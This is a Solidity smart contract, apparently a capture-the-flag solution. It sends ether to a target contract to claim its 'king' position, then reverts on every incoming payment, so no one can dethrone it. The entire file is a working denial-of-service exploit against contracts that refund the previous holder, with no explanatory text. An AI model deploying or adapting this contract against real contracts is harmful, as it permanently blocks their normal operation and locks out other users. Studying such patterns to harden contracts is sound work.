// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingBlocker {
    constructor(address target) payable {
        (bool sent,) = target.call{value: msg.value}("");
        require(sent, "Failed to become king");
    }

    // Reject ETH — any attempt to dethrone you will fail
    receive() external payable {
        revert("I shall not be dethroned");
    }
}